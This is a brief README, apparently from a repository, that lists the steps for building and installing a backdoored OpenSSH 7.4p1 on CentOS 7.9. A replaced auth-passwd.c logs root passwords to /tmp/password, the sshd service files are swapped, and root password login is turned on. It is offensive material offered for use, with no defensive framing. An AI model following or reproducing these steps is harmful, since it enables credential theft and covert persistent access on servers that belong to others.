## openssh-backdoor for centos7.9
* download openssh-7.4p1
* instead of auth-passwd.c , root passwd will keep in /tmp/password file
* install openssh
* cp contrib/redhat/sshd.init /etc/init.d/sshd.init
* /etc/init.d/sshd.init restart
* cp /run/systemd/generator.late/sshd.init.service /usr/lib/systemd/system/sshd.service
* systemctl daemon-reload && systemctl restart sshd
* change PermitRootLogin prohibit-password to PermitRootLogin yes in /etc/ssh/sshd_config
